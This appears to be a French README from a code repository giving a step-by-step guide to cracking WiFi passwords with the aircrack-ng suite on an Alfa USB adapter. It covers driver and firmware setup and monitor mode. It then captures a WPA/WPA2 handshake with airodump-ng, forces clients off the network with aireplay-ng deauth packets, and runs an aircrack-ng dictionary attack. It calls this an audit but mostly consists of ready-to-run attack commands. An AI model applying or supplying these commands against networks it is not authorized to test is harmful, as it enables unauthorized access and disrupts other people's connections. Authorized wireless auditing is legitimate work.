## Installation
1. Prérequis : 
    - Un système Linux (Ubuntu, Debian, Fedora, etc.).
    - Les droits d'administration (commande sudo).
    - Accès à Internet pour télécharger les pilotes.
    
2. Pilotes :
    - `lsusb` : voir si la carte est reconnu en usb
    - `ip link show` : lister interfaces réseaux

    Si rien n'est affiché, rechercher les pilotes et regarder les logs :
        - Dans ce cas j'utilise une AWUS036ACHM : `dmesg | grep mt7610`
   
## Configurations
1. Fichier manquants pour le firmware : `/lib/firmware/mediatek/`
    - `mt7610u.bin` `mt7610e.bin` sont des fichiers de conf à importer dans `/lib/firmware/mediatek/`
    - `git clone git://git.kernel.org/pub/scm/linux/kernel/git/firmware/linux-firmware.git`

2. Recharger les pilotes 
    - `sudo rmmod mt76x0u`
    - `sudo modprobe mt76x0u`

3. Voir si une erreur est présente : `dmesg | grep firmware`


4. Kill les processus
    - `sudo airmon-ng check kill`
        Effet : Cette commande désactive les services responsables des interférences
        Remarque : Après l'audit, vous pouvez redémarrer ces services pour rétablir la gestion classique des connexions WiFi.
![Screenshot_20250526_094939](https://github.com/user-attachments/assets/93654c09-a287-4668-b1f7-52c9f2712781)


## UP la carte et mode monitor
![alfa 1](https://github.com/user-attachments/assets/bf2410dd-acee-4394-b5d3-f8a703d51151)

- `sudo iwconfig // sudo ifconfig` : Montre toutes les interfaces avec les mode des cartes.

- `sudo ifconfig "INTERFACE" down` : Désactive l'interface réseau.
- `sudo iwconfig "INTERFACE" mode monitor` : Active le mode monitor.
- `sudo iwconfig "INTERFACE" mode managed` : Active le mode managed (de base).
- `sudo ifconfig "INTERFACE" up` : Active l'interface réseau.

![alfa 2](https://github.com/user-attachments/assets/4f7cdc10-bcc9-45c6-a035-5c5d57db0191)


## COMMANDES
- `sudo airmon-ng start "INTERFACE"` `sudo airmon-ng stop "INTERFACE"` avec `sudo iw "INTERFACE" del`
    But : Active le mode monitor sur l'interface spécifiée.
    Pourquoi : airmon-ng simplifie la gestion du mode monitor et s'assure qu'il n'y a pas de conflit avec d'autres processus.
- `sudo iw dev` pour voir la carte
- `sudo airodump-ng "INTERFACE"`
    But : Affiche une liste des réseaux WiFi détectés.
    Pourquoi : Cela vous permet de repérer le réseau cible et de récupérer son BSSID, son canal (CH) et son nom (ESSID).
![alfa 3](https://github.com/user-attachments/assets/713b017e-7b15-4695-9f5a-b846c3b543ef)

- `sudo airodump-ng "INTERFACE" --bssid [BSSID] -c [CHANNEL] -w capture`
    Options détaillées :
        --bssid [BSSID] : Filtre les paquets pour capturer uniquement ceux provenant du point d'accès cible (adresse MAC).
        -c [CHANNEL] : Limite la capture au canal WiFi spécifié.
        -w capture : Enregistre les paquets capturés dans un fichier nommé capture-01.cap.
    Pourquoi : La capture est nécessaire pour récupérer une handshake WPA/WPA2, indispensable pour tenter de casser le mot de passe.
![alfa 5](https://github.com/user-attachments/assets/dd844221-6c9d-4a3e-a933-c335364a01a4)

- Lorsqu'une handshake est capturée, vous verrez une ligne similaire à ceci : WPA handshake: [BSSID]
- Si vous ne voyez pas de handshake, cela signifie que :
    Aucun appareil ne s'est connecté ou reconnecté.
    Vous devrez provoquer une déconnexion/reconnexion

- Déconnecter l'appareil avec aireplay-ng
    Une fois que vous avez l'adresse MAC de l'appareil, vous pouvez l'utiliser pour envoyer un paquet de déconnexion (deauth) via aireplay-ng :
    - `sudo aireplay-ng --deauth 10 -a [BSSID] -c [CLIENT_MAC] "INTERFACE"`
        --deauth 10 : Envoie 10 paquets de déconnexion (vous pouvez ajuster ce nombre selon vos besoins). Vous pouvez aussi envoyer un nombre plus élevé pour augmenter les chances de déconnexion.
        -a [BSSID] : L'adresse MAC de l'Access Point (routeur).
        -c [CLIENT_MAC] : L'adresse MAC du client (appareil à déconnecter).
        "INTERFACE" : L'interface WiFi en mode monitor. 
        Important : L'appareil ciblé devrait se déconnecter et tenter une reconnexion automatiquement, ce qui générera une handshake WPA/WPA2.
![alfa 6](https://github.com/user-attachments/assets/bd986815-e0e7-4cf1-9481-3244edf4bff4)

- Vérifier si il y a bien un handshake 
    - `sudo aircrack-ng file.cap` (1 handshake)
    - `sudo tshark -r file.cap eapol`
    Sinon
    - `sudo wireshark -r file.cap` et chercher des fichier oapol
    - `sudo tshark -r file.cap -Y "eapol && wlan.addr==CLIENT"`

![alfa 7](https://github.com/user-attachments/assets/7e01ba27-9759-4225-b1ec-9de4c9a67c3b)

![alfa 8](https://github.com/user-attachments/assets/e4029c69-9693-43f3-9d8e-ea6b1515737c)


- `sudo aircrack-ng -w [wordlist.txt] -b [BSSID] capture-01.cap`
    Options détaillées :
        -w [wordlist.txt] : Spécifie un fichier contenant une liste de mots de passe possibles.
        -b [BSSID] : Cible le point d'accès spécifié.
        capture-01.cap : Utilise le fichier de capture généré par airodump-ng.
    Pourquoi : Cette étape tente de casser le mot de passe en utilisant une attaque par dictionnaire.
![alfa 9](https://github.com/user-attachments/assets/883c16d7-9eb5-4b23-9aef-a5d433af1714)


## Restaurer les services après l’audit

Après avoir terminé, redémarrez les services pour reprendre une utilisation normale du WiFi :
- `sudo ifconfig "INTERFACE" down` : Désactive l'interface réseau.
- `sudo iwconfig "INTERFACE" mode managed` : Active le mode managed (de base).
- `sudo ifconfig "INTERFACE" up` : Active l'interface réseau.

- `sudo airmon-ng stop "INTERFACE"` avec `sudo iw "INTERFACE" del`

- `sudo systemctl restart NetworkManager`
- `sudo systemctl restart wpa_supplicant`
